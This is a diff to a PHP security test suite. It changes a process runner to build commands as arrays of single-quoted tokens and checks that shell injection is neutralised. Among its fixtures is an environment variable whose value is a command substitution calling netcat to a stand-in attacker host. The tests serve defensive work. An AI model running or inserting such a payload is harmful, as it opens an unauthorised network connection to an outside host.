@@ -51,12 +51,19 @@ it('prevents command injection through performance configuration', function () {
         $instruments = $conductor->getInstruments();
         expect($instruments)->toBeArray();
 
-        // Commands are passed through as-is to Symfony Process
-        // The security is handled by Process class which properly escapes arguments
-        foreach ($instruments as $instrument) {
-            expect($instrument['command'])->toBeString();
-            // Command should contain the malicious input but will be safely handled by Symfony Process
-        }
+        $performance = array_values(array_values($config['performances'])[0])[0];
+        $parts = $score->buildCommand($performance);
+        expect($parts)->toBeArray();
+
+        $performer = new Performer('test', $parts, ['memory' => 256]);
+        $method = (new ReflectionClass($performer))->getMethod('buildProcessCommand');
+        $method->setAccessible(true);
+        $shellString = $method->invoke($performer);
+
+        expect($shellString)->toContain("'php'");
+        expect($shellString)->toContain("'artisan'");
+        // Every token is single-quoted — metacharacters cannot be interpreted by the shell
+        expect($shellString)->toMatch("/^(nice -n -?\\d+ )?'[^']*'( '[^']*')*$/");
     }
 });
 
@@ -73,7 +80,7 @@ it('validates and sanitizes performer names', function () {
 
     foreach ($maliciousNames as $maliciousName) {
         // Performer name is used in process naming, not command execution
-        $performer = new Performer($maliciousName, 'echo test', [
+        $performer = new Performer($maliciousName, ['echo', 'test'], [
             'memory' => 256,
             'timeout' => 30,
             'options' => [],
@@ -115,16 +122,22 @@ it('prevents injection through command options', function () {
         $score = new Score($config);
 
         $performance = $score->getPerformance('test-worker');
-        $command = $score->buildCommand($performance);
+        $parts = $score->buildCommand($performance);
 
-        // Command building should handle options safely
-        expect($command)->toBeString();
-        expect($command)->toContain('php artisan queue:work');
+        // Command building should return an array of tokens
+        expect($parts)->toBeArray();
+        expect($parts)->toContain('php');
+        expect($parts)->toContain('artisan');
+        expect($parts)->toContain('queue:work');
 
-        // Malicious content should be treated as option values, not executed
-        foreach ($options as $value) {
-            expect($command)->toContain((string) $value);
-        }
+        $performer = new Performer('test', $parts, ['memory' => 256]);
+        $method = (new ReflectionClass($performer))->getMethod('buildProcessCommand');
+        $method->setAccessible(true);
+        $shellString = $method->invoke($performer);
+
+        // Each token is single-quoted — metacharacters cannot be interpreted
+        expect($shellString)->toContain("'php'");
+        expect($shellString)->toContain("'artisan'");
     }
 });
 
@@ -137,7 +150,7 @@ it('prevents injection through environment variables', function () {
         'PS1' => '$(nc evil.com 1337)',
     ];
 
-    $performer = new Performer('test-worker', 'echo test', [
+    $performer = new Performer('test-worker', ['echo', 'test'], [
         'memory' => 256,
         'timeout' => 30,
         'options' => [],
@@ -177,8 +190,9 @@ it('handles path traversal attacks in configuration', function () {
         // Should store the path as-is (not resolve or execute it)
         expect($performance['command'])->toBe($path);
 
-        $command = $score->buildCommand($performance);
-        expect($command)->toContain($path);
+        $parts = $score->buildCommand($performance);
+        expect($parts)->toBeArray();
+        expect($parts)->toContain($path);
     }
 });
 
@@ -190,7 +204,7 @@ it('prevents null byte injection', function () {
     ];
 
     foreach ($nullByteCommands as $command) {
-        $performer = new Performer('test-worker', $command, [
+        $performer = new Performer('test-worker', [$command], [
             'memory' => 256,
             'timeout' => 30,
             'options' => [],
@@ -276,7 +290,7 @@ it('prevents log injection attacks', function () {
     ];
 
     foreach ($maliciousData as $data) {
-        $performer = new Performer($data, 'echo test', [
+        $performer = new Performer($data, ['echo', 'test'], [
             'memory' => 256,
             'timeout' => 30,
             'options' => [],
@@ -310,7 +324,7 @@ it('validates resource limits to prevent DoS', function () {
         ], $limits);
 
         // Should be able to create performer with any limits
-        $performer = new Performer('test-worker', $config['command'], $config);
+        $performer = new Performer('test-worker', [$config['command']], $config);
         expect($performer)->toBeInstanceOf(Performer::class);
 
         // Actual resource enforcement would happen at the OS/process level
@@ -327,7 +341,7 @@ it('prevents serialization attacks', function () {
 
     foreach ($maliciousSerializedData as $data) {
         // Test storing serialized data in various places
-        $performer = new Performer($data, 'echo test', [
+        $performer = new Performer($data, ['echo', 'test'], [
             'memory' => 256,
             'timeout' => 30,
             'options' => [$data => $data],
